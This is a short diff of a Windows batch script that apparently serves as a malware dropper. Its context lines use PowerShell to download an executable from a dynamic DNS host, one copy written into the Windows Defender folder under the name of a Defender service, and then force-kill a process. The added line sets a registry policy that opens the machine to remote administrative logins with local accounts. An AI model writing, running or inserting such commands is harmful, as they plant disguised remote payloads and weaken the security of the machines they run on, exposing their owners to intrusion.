@@ -8,6 +8,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/cacert.pem','%windir%\cacert.pem')
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/woffice.exe','%windir%\woffice.exe')
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 rem %windir%\wofficeie1.exe
 SLEEP 10
 taskkill /f /im wup.exe
